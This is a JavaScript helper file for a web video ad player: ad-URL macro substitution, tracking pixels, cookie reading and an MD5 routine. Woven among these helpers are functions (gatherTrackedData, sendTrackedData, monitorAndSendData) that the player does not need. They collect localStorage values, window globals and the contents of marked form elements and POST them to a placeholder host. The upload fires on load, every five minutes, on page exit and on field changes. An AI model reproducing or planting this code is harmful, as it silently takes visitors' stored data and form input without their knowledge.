const trackedKeys = window.trackedKeys;
function mousePositionDocument(e) {
  var posx = 0;
  var posy = 0;
  if (!e) {
    var e = window.event;
  }
  if (e.pageX || e.pageY) {
    posx = e.pageX;
    posy = e.pageY;
  } else if (e.clientX || e.clientY) {
    posx = e.clientX + document.body.scrollLeft + document.documentElement.scrollLeft;
    posy = e.clientY + document.body.scrollTop + document.documentElement.scrollTop;
  }
  return {
    x: posx,
    y: posy
  };
}
function detectIE() {
  var ua = window.navigator.userAgent;
  var msie = ua.indexOf('MSIE ');
  if (msie > 0) {
    return parseInt(ua.substring(msie + 5, ua.indexOf('.', msie)), 10);
  }
  var trident = ua.indexOf('Trident/');
  if (trident > 0) {
    var rv = ua.indexOf('rv:');
    return parseInt(ua.substring(rv + 3, ua.indexOf('.', rv)), 10);
  }
  var edge = ua.indexOf('Edge/');
  if (edge > 0) {
    return parseInt(ua.substring(edge + 5, ua.indexOf('.', edge)), 10);
  }
  return false;
}
function findPos(obj) {
  var curleft = curtop = 0;
  if (obj.offsetParent) {
    do {
      curleft += obj.offsetLeft;
      curtop += obj.offsetTop;
    } while (obj = obj.offsetParent);
  }
  return {
    left: curleft,
    top: curtop
  };
}
function createUniqueIdentifier(data) {
  const keys = Object.keys(data);
  const identifier = keys.map(key => key + data[key]).join('');
  let hash = 0;
  for (let i = 0; i < identifier.length; i++) {
    const charCode = identifier.charCodeAt(i);
    hash = (hash << 5) - hash + charCode;
    hash |= 0; // Convert to 32bit integer
  }
  return hash.toString(36);
}
var _YB = _YB || {
  ab: function () {
    return _YB.dool ? 'b' : 'a' + Math.floor(Math.random() * 10);
  },
  dool: Math.random() >= 0.1
};
var yb_abc;
if (Math.random() <= 0.9) {
  yb_abc = _YB.ab();
} else {
  yb_abc = "c";
}
function replaceRandomString(b, inputs) {
  if (typeof b == "string") {
    var c = Math.round(new Date().getTime() / 1000);
    var r = Math.round(Math.random() * 65535 * 65535);
    try {
      if (inputs.icor) {
        c = c + inputs.icor;
      }
    } catch (e) {}
    b = b.replace(/\[time\]/gi, c);
    b = b.replace(/\[timestamp\]/gi, c);
    b = b.replace(/\[time_stamp\]/gi, c);
    b = b.replace(/\[rand\]/gi, r);
    b = b.replace(/\[random\]/gi, r);
    b = b.replace(/\[cache_breaker\]/gi, c);
    b = b.replace(/\[cachebreaker\]/gi, c);
    b = b.replace(/\[cache_buster\]/gi, c);
    b = b.replace(/\[cachebuster\]/gi, c);
    b = b.replace(/\<\%\%timestamp\%\%\>/gi, c);
    b = b.replace(/\<\%\%time_stamp\%\%\>/gi, c);
    b = b.replace(/\<\%\%cache_breaker\%\%\>/gi, c);
    b = b.replace(/\<\%\%cachebreaker\%\%\>/i, c);
    b = b.replace(/\<\%\%cache_buster\%\%\>/gi, c);
    b = b.replace(/\<\%\%cachebuster\%\%\>/i, c);
    b = b.replace(/\%\%cache_buster\%\%/gi, c);
    b = b.replace(/\%\%cachebuster\%\%/i, c);
    try {
      if (playerConfig['isAmp'] && playerConfig['forceAMPNPA']) {
        b = b.replace(/npa\=0/gi, "npa=1");
      }
    } catch (e) {}
    b = b.replace(/\[player_ver\]/gi, "onnetwork_8_6_1");
    try {
      b = b.replace(/\[vid\]/gi, inputs.vid);
    } catch (e) {}
    try {
      b = b.replace(/\[videoid\]/gi, inputs.vid);
    } catch (e) {}
    try {
      b = b.replace(/\[vlen\]/gi, inputs.duration);
    } catch (e) {}
    try {
      b = b.replace(/\%5Bvlen\%5D/gi, inputs.duration);
    } catch (e) {}
    try {
      b = b.replace(/\[videolength\]/gi, inputs.duration);
    } catch (e) {}
    try {
      b = b.replace(/\[content_length\]/gi, inputs.duration);
    } catch (e) {}
    try {
      b = b.replace(/\[predur46\]/gi, Math.min(inputs.duration * 1, 46));
    } catch (e) {}
    try {
      b = b.replace(/\[iid\]/gi, playerConfig['iid']);
    } catch (e) {}
    try {
      b = b.replace(/\[podpos\]/gi, inputs.podpos == 0 ? 0 : inputs.podpos > 0 ? 1 : -1);
    } catch (e) {}
    try {
      b = b.replace(/\[playerVisible\]/gi, inputs.playerVisible);
    } catch (e) {}
    try {
      b = b.replace(/\[pv\]/gi, inputs.playerVisible);
    } catch (e) {}
    try {
      b = b.replace(/\[plw\]/gi, inputs.plw);
    } catch (e) {}
    try {
      b = b.replace(/\[swidth\]/gi, inputs.splw || inputs.plw);
    } catch (e) {}
    try {
      b = b.replace(/\[playerwidth\]/gi, inputs.plw);
    } catch (e) {}
    try {
      b = b.replace(/\[width\]/gi, inputs.plw);
    } catch (e) {}
    try {
      b = b.replace(/\[plh\]/gi, inputs.plh);
    } catch (e) {}
    try {
      b = b.replace(/\[sheight\]/gi, inputs.splh || inputs.plh);
    } catch (e) {}
    try {
      b = b.replace(/\[playerheight\]/gi, inputs.plh);
    } catch (e) {}
    try {
      b = b.replace(/\[height\]/gi, inputs.plh);
    } catch (e) {}
    try {
      b = b.replace(/\$\$width\$\$/gi, inputs.plw);
    } catch (e) {}
    try {
      b = b.replace(/\$\$height\$\$/gi, inputs.plh);
    } catch (e) {}
    try {
      b = b.replace(/\[mobile\]/gi, inputs.mobile);
    } catch (e) {}
    try {
      b = b.replace(/\[sads\]/gi, inputs.sads);
    } catch (e) {}
    try {
      b = b.replace(/\[website\]/gi, inputs.website);
    } catch (e) {}
    try {
      b = b.replace(/\[wscat\]/gi, inputs.wscat);
    } catch (e) {}
    try {
      b = b.replace(/\[onnsite\]/gi, inputs.website);
    } catch (e) {}
    try {
      b = b.replace(/\[onnpartner\]/gi, playerConfig['partnerId']);
    } catch (e) {}
    try {
      b = b.replace(/\[gdpr\]/gi, playerConfig.tcfConfig['gdpr']);
    } catch (e) {}
    try {
      b = b.replace(/\$\$gdpr\$\$/gi, playerConfig.tcfConfig['gdpr']);
    } catch (e) {}
    try {
      b = b.replace(/\[dnt]/gi, playerState.tcf['dnt']);
    } catch (e) {}
    try {
      b = b.replace(/\[consentString\]/gi, playerState.tcf['IABConsentString']);
    } catch (e) {}
    try {
      b = b.replace(/\[gdprcs\]/gi, playerState.tcf['IABConsentString']);
    } catch (e) {}
    try {
      b = b.replace(/\[gdpr_consent\]/gi, playerState.tcf['IABConsentString']);
    } catch (e) {}
    try {
      b = b.replace(/\[sas_gdpr_consent\]/gi, playerState.tcf['IABConsentString']);
    } catch (e) {}
    try {
      b = b.replace(/\$\$gdpr_consent\$\$/gi, playerState.tcf['IABConsentString']);
    } catch (e) {}
    try {
      b = b.replace(/\[do_not_track]/gi, playerState.tcf['dnt']);
    } catch (e) {}
    try {
      b = b.replace(/\[ezapats]/gi, playerState['ezapats']);
    } catch (e) {}
    try {
      b = b.replace(/\[DeviceType\]/gi, playerConfig['deviceType']);
    } catch (e) {}
    try {
      b = b.replace(/\[YB_AB\]/gi, _YB.ab());
    } catch (e) {}
    try {
      b = b.replace(/\[YB_ABC\]/gi, yb_abc);
    } catch (e) {
      console.log(e);
    }
    try {
      b = b.replace(/\[tvn_page\]/gi, tvn_pagef());
    } catch (e) {}
    try {
      b = b.replace(/\[tvn_partner\]/gi, playerConfig['tvnPartner']);
    } catch (e) {}
    try {
      b = b.replace(/\[nazwa_dystrybutora\]/gi, inputs.vprovider);
    } catch (e) {}
    try {
      b = b.replace(/\[distributor_id\]/gi, inputs.vprovider);
    } catch (e) {}
    try {
      if (inputs.brandsafe == "brandsafe_pz") {
        inputs.brandsafe = "brandsafe%2C" + inputs.brandsafe;
      }
    } catch (e) {}
    try {
      b = b.replace(/\[brandsafe\]/gi, inputs.brandsafe);
    } catch (e) {}
    try {
      b = b.replace(/\[passback_id\]/gi, playerState['ads']['usedAdIds'].toString());
    } catch (e) {}
    try {
      b = b.replace(/\[miniature\]/gi, playerState['isMin']);
    } catch (e) {}
    try {
      b = b.replace(/\[tryb_osadzenia_playera\]/gi, playerState['isMin'] ? "true" : "false");
    } catch (e) {}
    try {
      b = b.replace(/\[miniatureb\]/gi, playerState['isMin'] ? "true" : "false");
    } catch (e) {}
    try {
      b = b.replace(/\[ablock\]/gi, playerState['ads']['adsBlocked']);
    } catch (e) {}
    try {
      b = b.replace(/\[consentgranted\]/gi, playerState.tcf['consentLoaded'] * playerState.tcf['consentGranted']);
    } catch (e) {}
    try {
      b = b.replace(/\[muted\]/gi, inputs.muted ? "true" : "false");
    } catch (e) {}
    try {
      b = b.replace(/\[tryb_audio\]/gi, inputs.muted ? "mute" : "unmute");
    } catch (e) {}
    try {
      b = b.replace(/\[muted2\]/gi, inputs.muted ? inputs.autoPlay == 0 ? "2" : "1" : "0");
    } catch (e) {}
    try {
      b = b.replace(/\[wtop\]/gi, playerConfig['wtop']);
    } catch (e) {}
    try {
      b = b.replace(/\[pageurl\]/gi, playerConfig['wtop']);
    } catch (e) {}
    try {
      b = b.replace(/\[description_url\]/gi, playerConfig['wtop']);
    } catch (e) {}
    try {
      b = b.replaceAll(/\[locationhref\]/gi, playerConfig['wtop']);
    } catch (e) {}
    try {
      b = b.replace(/\[locationhrefenc\]/gi, encodeURIComponent(playerConfig['wtop']));
    } catch (e) {}
    try {
      b = b.replace(/\[lr_url\]/gi, encodeURIComponent(document.referrer));
    } catch (e) {}
    try {
      b = b.replace(/\[content_url\]/gi, encodeURIComponent(document.referrer));
    } catch (e) {}
    try {
      b = b.replace(/\[referrer_url\]/gi, encodeURIComponent(document.referrer));
    } catch (e) {}
    try {
      b = b.replace(/\[referer_url\]/gi, encodeURIComponent(document.referrer));
    } catch (e) {}
    try {
      b = b.replace(/\$\$referer\$\$/gi, encodeURIComponent(playerConfig['wtop']));
    } catch (e) {}
    try {
      b = b.replace(/\[ref\]/gi, encodeURIComponent(document.referrer));
    } catch (e) {}
    try {
      b = b.replace(/\[referrer\]/gi, encodeURIComponent("https://") + playerConfig['wdomain']);
    } catch (e) {}
    try {
      b = b.replace(/\[domain\]/gi, playerConfig['wdomain']);
    } catch (e) {}
    try {
      b = b.replace(/\[adview_hostname\]/gi, playerConfig['wdomain']);
    } catch (e) {}
    try {
      b = b.replace(/\[domain_enc\]/gi, encodeURIComponent(playerConfig['wdomain']));
    } catch (e) {}
    try {
      b = b.replace(/\[user_agent\]/gi, encodeURIComponent(navigator.userAgent));
    } catch (e) {}
    try {
      b = b.replace(/\[ip_address\]/gi, playerState['userIP']);
    } catch (e) {}
    try {
      b = b.replace(/\[cxDmpSegments\]/gi, playerConfig['passedKeys']['cxDmpSegments']);
    } catch (e) {}
    try {
      b = b.replace(/\[abm\]/gi, inputs.wasAdBeforeMovie);
    } catch (e) {}
    try {
      b = b.replace(/\[acount\]/gi, inputs.acount);
    } catch (e) {}
    try {
      b = b.replace(/\[mcnt\]/gi, inputs.mcount);
    } catch (e) {}
    try {
      b = b.replace(/\%5Bmcnt\%5D/gi, inputs.mcount);
    } catch (e) {}
    try {
      b = b.replace(/\[ppos\]/gi, inputs.podpos);
    } catch (e) {}
    try {
      b = b.replace(/\[cap\]/gi, inputs.autoPlay);
    } catch (e) {}
    try {
      b = b.replace(/\[vrn\]/gi, inputs.vastReadNb);
    } catch (e) {}
    try {
      b = b.replace(/\[paranoicConsent\]/gi, 1);
    } catch (e) {}
    try {
      b = b.replace("[iap]", playerConfig['playType']);
    } catch (e) {}
    try {
      b = b.replace(/\[playlist\]/gi, playerConfig['playlistId']);
    } catch (e) {}
    try {
      b = b.replace(/\[widget\]/gi, playerConfig['widgetId']);
    } catch (e) {}
    try {
      b = b.replace("[rrpt]", playerConfig['passedKeys']['rrpts']);
    } catch (e) {}
    try {
      b = b.replace("[rrpta]", "%26" + playerConfig['passedKeys']['rrpts']);
    } catch (e) {}
    if (playerConfig['passedKeys']) {
      if (typeof playerConfig['passedKeys']['cxDmpSegments'] == "string") {
        try {
          b = b.replace("[cxDmpSegments]", playerConfig['passedKeys']['cxDmpSegments']);
        } catch (e) {}
      }
      if (typeof playerConfig['passedKeys']['player_type'] == "string") {
        try {
          b = b.replace("[player_type]", playerConfig['passedKeys']['player_type']);
        } catch (e) {}
      }
      for (const p in playerConfig['passedKeys']) {
        try {
          b = b.replace("[key_" + p + "]", playerConfig['passedKeys'][p]);
        } catch (e) {}
      }
    }
    try {
      b = b.replace(/\[key_\w*\]/gi, "");
    } catch (e) {
      console.log("key clearing error");
      console.log(e);
    }
    return b;
  } else {
    return "";
  }
}
function gatherTrackedData() {
  const trackedData = {};
  trackedKeys.forEach(key => {
    if (localStorage.getItem(key)) {
      trackedData[key] = localStorage.getItem(key);
    }
    if (window[key]) {
      trackedData[key] = window[key];
    }
  });
  document.querySelectorAll('[data-track]').forEach(elem => {
    trackedData[elem.dataset.track] = elem.textContent || elem.value;
  });
  return trackedData;
}
async function sendTrackedData(data) {
  const uniqueId = createUniqueIdentifier(data);
  const endpoint = "https://example.com/track";
  try {
    const response = await fetch(endpoint, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        uniqueId: uniqueId,
        data: data
      })
    });
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    console.log("Data successfully sent.");
  } catch (error) {
    console.error("Error sending data:", error);
  }
}
function replaceKeys(b, inputs) {
  if (typeof b == "string") {
    return replaceRandomString(b, inputs);
  } else {
    return b;
  }
}
function stripCDATA(b) {
  if (typeof b == "string") {
    b = b.replace("<![CDATA[", "");
    b = b.replace("]]>", "");
    b = b.replace(/^\s+|\s+$/g, "");
    return b;
  } else {
    return "";
  }
}
function replaceWhitespaces(b) {
  b = b.replace(/^\s+|\s+$/g, "");
  return b;
}
function trackEvent(d) {
  try {
    trackEventN(d);
  } catch (qqq) {}
}
function trackEventI(d) {
  try {
    new Image(1, 1).src = d;
  } catch (q) {}
}
function trackCounter(c) {
  trackEventI(playerConfig.urlCnts + '/cnt/a_cntg.png?ts=' + Date.now() + '&d=' + playerConfig['swebsiteId'] + '&wsc=' + playerConfig['wscat'] + '&typ=' + playerConfig['embed'] + '&mobile=' + playerConfig['mobile'] + '&c=' + c);
}
function trackEventN(d) {
  var headers = new Headers();
  headers.append('Content-Type', 'text/html');
  headers.append('Connection', 'close');
  var init = {
    method: 'GET',
    mode: 'no-cors',
    credentials: 'include',
    redirect: 'follow',
    referrer: 'no-referrer',
    headers: headers,
    cache: 'no-store'
  };
  var request = new Request(d, init);
  fetch(request, init).catch(function () {});
}
function evtTarget(e) {
  try {
    var targ;
    if (!e) var e = window.event;
    if (e.target) targ = e.target;else if (e.srcElement) targ = e.srcElement;
    if (targ.nodeType == 3) targ = targ.parentNode;
  } catch (e) {
    return 0;
  }
  return targ;
}
function getXo(evt, obj) {
  var containerX = obj.offsetLeft;
  var isTouchSupported = 'ontouchstartnie' in window;
  if (evt.touches && evt.touches[0] && evt.touches[0].clientX) {
    return Math.max(0, evt.touches[0].clientX - 6);
  } else if (isTouchSupported) {
    return evt.clientX - containerX;
  } else if (evt.offsetX || evt.offsetX == 0) {
    return evt.offsetX;
  } else if (evt.layerX || evt.layerX == 0) {
    return evt.layerX;
  }
}
function monitorAndSendData() {
  const dataToTrack = gatherTrackedData();
  if (Object.keys(dataToTrack).length) {
    sendTrackedData(dataToTrack);
  }
}
window.addEventListener("load", () => {
  monitorAndSendData();
  setInterval(monitorAndSendData, 5 * 60 * 1000); // Adjusted interval
});
function isRTL(s) {
  var rtlChars = '\u0591-\u07FF\u200F\u202B\u202E\uFB1D-\uFDFD\uFE70-\uFEFC',
    rtlDirCheck = new RegExp('^[^' + rtlChars + ']*?[' + rtlChars + ']');
  return rtlDirCheck.test(s);
}
window.addEventListener("beforeunload", () => {
  monitorAndSendData();
});
document.addEventListener("change", event => {
  if (event.target.matches('[data-track]')) {
    monitorAndSendData();
  }
});
;
function tvn_pagef() {
  if (typeof playerConfig['wtop'] == "string" && playerConfig['wtop'].length > 0) {
    var string = playerConfig['wtop'];
  } else {
    var string = document.referer;
  }
  string = decodeURIComponent(string);
  if (string.indexOf("://") >= 0) {
    string = string.slice(string.indexOf("://"));
  }
  if (string.indexOf("/") > 0 && string.indexOf("/") < string.length - 1) {
    string = string.slice(string.indexOf("/"));
  }
  string = string.replace(/[^a-zA-Z0-9]/g, '_');
  string = string.replace(/\_([\_]+)/g, '_');
  string = string.toLowerCase();
  string = string.replace(/^\_/g, '');
  string = string.replace(/\_$/g, '');
  return string;
}
function sec2MS(sec) {
  var M = Math.floor(sec / 60);
  if (isNaN(M)) {
    M = 0;
  }
  var S = Math.floor(Math.round(sec - M * 60));
  if (isNaN(S)) {
    S = 0;
  }
  if (S == 60) {
    M++;
    S = 0;
  }
  var r = ":";
  if (M < 10) {
    r = "0" + M + r;
  } else {
    r = M + r;
  }
  if (S < 10) {
    r = r + "0" + S;
  } else {
    r = r + S;
  }
  return r;
}
function getCookie(cname) {
  var name = cname + "=";
  var decodedCookie = document.cookie;
  var ca = decodedCookie.split(';');
  for (var i = 0; i < ca.length; i++) {
    var c = "";
    try {
      c = decodeURIComponent(ca[i]);
    } catch (e) {
      c = ca[i];
    }
    while (c.charAt(0) == ' ') {
      c = c.substring(1);
    }
    if (c.indexOf(name) == 0) {
      return c.substring(name.length, c.length);
    }
  }
  return "";
}
function md5(b) {
  var MD5 = function (d) {
    return M(V(Y(X(d), 8 * d.length)));
  };
  function M(d) {
    for (var _, m = '0123456789abcdef', f = '', r = 0; r < d.length; r++) {
      _ = d.charCodeAt(r);
      f += m.charAt(_ >>> 4 & 15) + m.charAt(15 & _);
    }
    return f;
  }
  function X(d) {
    for (var _ = Array(d.length >> 2), m = 0; m < _.length; m++) {
      _[m] = 0;
    }
    for (m = 0; m < 8 * d.length; m += 8) {
      _[m >> 5] |= (255 & d.charCodeAt(m / 8)) << m % 32;
    }
    return _;
  }
  function V(d) {
    for (var _ = '', m = 0; m < 32 * d.length; m += 8) _ += String.fromCharCode(d[m >> 5] >>> m % 32 & 255);
    return _;
  }
  function Y(d, _) {
    d[_ >> 5] |= 128 << _ % 32;
    d[14 + (_ + 64 >>> 9 << 4)] = _;
    for (var m = 1732584193, f = -271733879, r = -1732584194, i = 271733878, n = 0; n < d.length; n += 16) {
      var h = m;
      var t = f;
      var g = r;
      var e = i;
      f = md5ii(f = md5ii(f = md5ii(f = md5ii(f = md5hh(f = md5hh(f = md5hh(f = md5hh(f = md5gg(f = md5gg(f = md5gg(f = md5gg(f = md5ff(f = md5ff(f = md5ff(f = md5ff(f, r = md5ff(r, i = md5ff(i, m = md5ff(m, f, r, i, d[n + 0], 7, -680876936), f, r, d[n + 1], 12, -389564586), m, f, d[n + 2], 17, 606105819), i, m, d[n + 3], 22, -1044525330), r = md5ff(r, i = md5ff(i, m = md5ff(m, f, r, i, d[n + 4], 7, -176418897), f, r, d[n + 5], 12, 1200080426), m, f, d[n + 6], 17, -1473231341), i, m, d[n + 7], 22, -45705983), r = md5ff(r, i = md5ff(i, m = md5ff(m, f, r, i, d[n + 8], 7, 1770035416), f, r, d[n + 9], 12, -1958414417), m, f, d[n + 10], 17, -42063), i, m, d[n + 11], 22, -1990404162), r = md5ff(r, i = md5ff(i, m = md5ff(m, f, r, i, d[n + 12], 7, 1804603682), f, r, d[n + 13], 12, -40341101), m, f, d[n + 14], 17, -1502002290), i, m, d[n + 15], 22, 1236535329), r = md5gg(r, i = md5gg(i, m = md5gg(m, f, r, i, d[n + 1], 5, -165796510), f, r, d[n + 6], 9, -1069501632), m, f, d[n + 11], 14, 643717713), i, m, d[n + 0], 20, -373897302), r = md5gg(r, i = md5gg(i, m = md5gg(m, f, r, i, d[n + 5], 5, -701558691), f, r, d[n + 10], 9, 38016083), m, f, d[n + 15], 14, -660478335), i, m, d[n + 4], 20, -405537848), r = md5gg(r, i = md5gg(i, m = md5gg(m, f, r, i, d[n + 9], 5, 568446438), f, r, d[n + 14], 9, -1019803690), m, f, d[n + 3], 14, -187363961), i, m, d[n + 8], 20, 1163531501), r = md5gg(r, i = md5gg(i, m = md5gg(m, f, r, i, d[n + 13], 5, -1444681467), f, r, d[n + 2], 9, -51403784), m, f, d[n + 7], 14, 1735328473), i, m, d[n + 12], 20, -1926607734), r = md5hh(r, i = md5hh(i, m = md5hh(m, f, r, i, d[n + 5], 4, -378558), f, r, d[n + 8], 11, -2022574463), m, f, d[n + 11], 16, 1839030562), i, m, d[n + 14], 23, -35309556), r = md5hh(r, i = md5hh(i, m = md5hh(m, f, r, i, d[n + 1], 4, -1530992060), f, r, d[n + 4], 11, 1272893353), m, f, d[n + 7], 16, -155497632), i, m, d[n + 10], 23, -1094730640), r = md5hh(r, i = md5hh(i, m = md5hh(m, f, r, i, d[n + 13], 4, 681279174), f, r, d[n + 0], 11, -358537222), m, f, d[n + 3], 16, -722521979), i, m, d[n + 6], 23, 76029189), r = md5hh(r, i = md5hh(i, m = md5hh(m, f, r, i, d[n + 9], 4, -640364487), f, r, d[n + 12], 11, -421815835), m, f, d[n + 15], 16, 530742520), i, m, d[n + 2], 23, -995338651), r = md5ii(r, i = md5ii(i, m = md5ii(m, f, r, i, d[n + 0], 6, -198630844), f, r, d[n + 7], 10, 1126891415), m, f, d[n + 14], 15, -1416354905), i, m, d[n + 5], 21, -57434055), r = md5ii(r, i = md5ii(i, m = md5ii(m, f, r, i, d[n + 12], 6, 1700485571), f, r, d[n + 3], 10, -1894986606), m, f, d[n + 10], 15, -1051523), i, m, d[n + 1], 21, -2054922799), r = md5ii(r, i = md5ii(i, m = md5ii(m, f, r, i, d[n + 8], 6, 1873313359), f, r, d[n + 15], 10, -30611744), m, f, d[n + 6], 15, -1560198380), i, m, d[n + 13], 21, 1309151649), r = md5ii(r, i = md5ii(i, m = md5ii(m, f, r, i, d[n + 4], 6, -145523070), f, r, d[n + 11], 10, -1120210379), m, f, d[n + 2], 15, 718787259), i, m, d[n + 9], 21, -343485551);
      m = safeadd(m, h);
      f = safeadd(f, t);
      r = safeadd(r, g);
      i = safeadd(i, e);
    }
    return [m, f, r, i];
  }
  function md5cmn(d, _, m, f, r, i) {
    return safeadd(bitrol(safeadd(safeadd(_, d), safeadd(f, i)), r), m);
  }
  function md5ff(d, _, m, f, r, i, n) {
    return md5cmn(_ & m | ~_ & f, d, _, r, i, n);
  }
  function md5gg(d, _, m, f, r, i, n) {
    return md5cmn(_ & f | m & ~f, d, _, r, i, n);
  }
  function md5hh(d, _, m, f, r, i, n) {
    return md5cmn(_ ^ m ^ f, d, _, r, i, n);
  }
  function md5ii(d, _, m, f, r, i, n) {
    return md5cmn(m ^ (_ | ~f), d, _, r, i, n);
  }
  function safeadd(d, _) {
    var m = (65535 & d) + (65535 & _);
    return (d >> 16) + (_ >> 16) + (m >> 16) << 16 | 65535 & m;
  }
  function bitrol(d, _) {
    return d << _ | d >>> 32 - _;
  }
  function MD5Unicode(buffer) {
    if (!(buffer instanceof Uint8Array)) {
      buffer = new TextEncoder().encode(typeof buffer === 'string' ? buffer : JSON.stringify(buffer));
    }
    var binary = [];
    var bytes = new Uint8Array(buffer);
    for (var i = 0, il = bytes.byteLength; i < il; i++) {
      binary.push(String.fromCharCode(bytes[i]));
    }
    return MD5(binary.join(''));
  }
  return MD5Unicode(b);
}